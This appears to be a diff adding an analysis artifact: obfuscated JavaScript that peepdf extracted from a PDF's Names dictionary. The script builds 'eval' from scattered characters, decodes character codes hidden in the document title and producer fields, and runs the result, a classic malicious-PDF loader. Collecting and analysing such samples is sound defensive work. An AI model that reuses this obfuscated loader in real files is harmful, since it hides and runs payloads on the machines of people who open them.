@@ -1,0 +1,26 @@
+// peepdf comment: Javascript code located in object 1 (version 0)
+
+<< /Names [(test) <</S /JavaScript
+/JS (
+var g = this;
+a=['l','v','e','a'];
+e=g[a[2]+a[1]+a[3]+a[0]];
+cgvyy=2011;
+var m = cgvyy-1979;
+var zwjrw="";
+weuj='his';
+bqi='.ti';
+e('mnz=t'+weuj+bqi+'tle');
+mnz=mnz.replace(/m / g, '*m');
+irge = '["prod';
+e('ynbry=t' + weuj + irge + 'ucer"]');
+gmuut = e('St' + ynbry);
+tiddb = mnz.split(',');
+for (i = 0; i < tiddb.length; i++) {
+    pnkh = e(tiddb[i]);
+    zwjrw += gmuut(pnkh);
+}
+e(zwjrw);
+
+) >> ] >>
+
